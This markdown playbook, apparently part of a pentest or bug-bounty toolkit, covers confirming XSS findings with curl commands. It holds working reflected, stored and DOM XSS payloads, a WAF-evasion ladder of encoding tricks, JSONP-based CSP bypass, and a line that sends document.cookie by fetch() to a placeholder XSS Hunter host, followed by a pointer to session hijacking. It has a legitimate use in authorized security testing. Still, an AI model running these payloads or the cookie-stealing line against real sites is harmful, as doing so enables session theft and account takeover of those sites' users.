# XSS — Verify

## Purpose
Confirm each reflected/stored/DOM XSS finding with reproducible exploits. Test browser execution, bypass WAF/CSP, and demonstrate actual JavaScript execution — not just tag reflection.

## Required Variables
- `$TARGET_URL` — vulnerable endpoint
- `$VULN_PARAM` — confirmed injectable parameter
- `$OUTDIR` — output root

## Commands

### V1 — Manual Execution Verification

```bash
export PATH="/opt/homebrew/bin:$HOME/go/bin:$HOME/Library/Python/3.14/bin:$PATH"

# Test that the payload actually executes (alert/document.cookie)
# Encode alert(document.domain) for proof of execution
PAYLOAD="<svg/onload=alert(document.domain)>"
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${PAYLOAD}'))")
curl -s "$TARGET_URL?${VULN_PARAM}=${ENC}" | grep -c 'onload=alert' && \
  echo "[VERIFIED] Reflected XSS on $TARGET_URL?${VULN_PARAM}=$PAYLOAD"

# Cookie theft test (if no HttpOnly)
PAYLOAD_COOKIE="<img src=x onerror=fetch('https://YOUR_XSSHUNTER.xss.ht?c='+document.cookie)>"
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${PAYLOAD_COOKIE}'))")
curl -s "$TARGET_URL?${VULN_PARAM}=${ENC}" -o /dev/null
```

### V2 — WAF / Encoding Bypass Ladder

```bash
# If basic payload is blocked, ladder through bypasses
# Case flip
curl -s "$TARGET_URL?${VULN_PARAM}=%3CImG%20sRc%3Dx%20oNeRrOr%3DaLerT(1)%3E"

# Null byte insertion
curl -s "$TARGET_URL?${VULN_PARAM}=%3Cscri%00pt%3Ealert(1)%3C%2Fscript%3E"

# Newline separated event
curl -s "$TARGET_URL?${VULN_PARAM}=%3Csvg%0Aonload%3Dalert(1)%3E"

# Tab separated event
curl -s "$TARGET_URL?${VULN_PARAM}=%3Csvg%09onload%3Dalert(1)%3E"

# Alternative HTML5 tags (WAF often misses newer ones)
for tag in '<details/open/ontoggle=alert(1)>' '<dialog/open/onclose=alert(1)>' '<input/autofocus/onfocus=alert(1)>' '<video><source/onerror=alert(1)>'; do
  enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${tag}'))")
  code=$(curl -s -o /dev/null -w '%{http_code}' "$TARGET_URL?${VULN_PARAM}=${enc}")
  echo "[$code] $tag" | tee -a "$OUTDIR/xss/bypass_attempts.txt"
done
```

### V3 — Stored XSS Verification

```bash
# POST the payload
curl -s -X POST "$TARGET_URL/comment" \
  -d "name=test&email=test@test.com&comment=%3Csvg/onload=alert(document.domain)%3E" \
  -H "Cookie: SESSION=$SESSION_COOKIE" -o "$OUTDIR/xss/stored_post_response.txt"

# Visit the page where the comment renders
sleep 2
curl -s "$TARGET_URL/comments" | grep -c 'onload=alert(document.domain)' && \
  echo "[VERIFIED] Stored XSS — payload persisted and reflected on page"

# Stored XSS via JSON API
curl -s -X POST "$TARGET_URL/api/posts" \
  -H "Content-Type: application/json" -H "Cookie: SESSION=$SESSION_COOKIE" \
  -d '{"title":"test","body":"<svg/onload=alert(document.domain)>"}' \
  -o "$OUTDIR/xss/stored_json_response.txt"
```

### V4 — DOM XSS Verification (dalfox headless)

```bash
dalfox url "$TARGET_URL" --silence --headless --trigger "#<img src=x onerror=alert(document.domain)>" -o "$OUTDIR/xss/dom_verified.txt"

# postMessage verification via Playwright
python3 skills/xss/xss_dom_sink_scanner.py --url "$TARGET_URL" --verify --output "$OUTDIR/xss/dom_pm_verified.json" 2>/dev/null
```

### V5 — CSP Bypass Verification

```bash
CSP=$(curl -sI "$TARGET_URL" | grep -i 'content-security-policy')
echo "$CSP" | tee "$OUTDIR/xss/csp_header.txt"

# If script-src 'self' — find JSONP endpoint
grep -iE 'callback=|jsonp=' "$OUTDIR/xss/gau_params.txt" | while read -r url; do
  test_url=$(echo "$url" | sed 's/callback=.*$/callback=alert(1)/')
  curl -s "$test_url" | grep -c 'alert(1)' && echo "[JSONP XSS] $url" >> "$OUTDIR/xss/jsonp_xss.txt"
done
```

## Detection Signals
- `grep -c` for `onload=alert(document.domain)` > 0 → code execution confirmed
- dalfox headless returns `[VULN]` → browser-confirmed DOM XSS
- Bypass attempt returns 200 with payload intact → WAF bypass successful
- JSONP endpoint reflects `alert(1)` in response → CSP bypass via JSONP

## False Positives
- Tag reflected but executed code is blocked by CSP → test with `alert()` not `document.cookie`
- Stored payload appears on page but is HTML-entity-encoded when rendered → not exploitable without mutation
- JSONP confirms `callback=` parameter but target uses strict `callback` whitelist → attempt alternative JSONP parameter names

## Next
├── If execution confirmed → go to `04-impact-escalation.md` for cookie theft / session hijack
├── If WAF bypass successful → document bypass technique in `04-impact-escalation.md`
├── If DOM XSS confirmed → capture full source-to-sink trace for report
└── Always → save verified PoC URL for evidence collection